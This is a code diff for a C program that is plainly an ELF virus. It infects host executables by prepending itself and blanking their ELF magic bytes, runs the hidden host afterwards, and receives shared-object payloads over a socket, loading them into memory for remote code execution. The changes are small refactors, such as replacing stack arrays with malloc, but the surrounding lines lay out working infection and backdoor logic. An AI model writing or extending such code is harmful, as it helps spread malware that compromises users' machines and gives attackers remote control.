@@ -87,8 +87,8 @@ int is_infected(char* f){
 void infect(FILE* h, FILE* p){
   long h_size = elf_size(h);
   long p_size = elf_size(p);
-  char h_buffer[h_size]; // this and below is possible by a gnu extension allowing allocation via the stack
-  char p_buffer[p_size]; // (in the future replace with a call to malloc...unless a reason to not can be found)
+  char* h_buffer = (char*)malloc(sizeof(char)*h_size);
+  char* p_buffer = (char*)malloc(sizeof(char)*p_size);
 
   // the use of 0xF is arbitary, 16 characters should suffice for common file name length
   char file_link[0xF];
@@ -98,7 +98,7 @@ void infect(FILE* h, FILE* p){
   fread(h_buffer, sizeof(char), h_size, h);
   fread(p_buffer, sizeof(char), p_size, p);
 
-  // replaces the elf magic number with O's
+  // replaces the host elf magic number with O's
   for(int i = 0; i < 4; ++i){
     *(h_buffer + i) = 0;
   }
@@ -122,7 +122,7 @@ void execute_host(FILE* f, char** argv, char** envp){
   fseek(f, p_size, SEEK_SET);
   fread(host, sizeof(char), h_size, f);
 
-  // put host's elf magic numbers back
+  // put host's elf magic number back
   host[0] = ELFMAG0;
   host[1] = ELFMAG1;
   host[2] = ELFMAG2;
@@ -147,7 +147,6 @@ void execute_host(FILE* f, char** argv, char** envp){
 }
 
 void load_so(int socket_fd, int size){
-
   // read file from socket into buffer and write file data to
   // the memory file descriptor then load .so payload into address space
   // to execute its constructor for remote code execution
@@ -164,7 +163,6 @@ void load_so(int socket_fd, int size){
 }
 
 void process_connection(int socket_fd){
-
   // read the first 13 bytes from the socket to get payload file size
   // then execute code to load the .so payload into the process address space
   char buff[13];
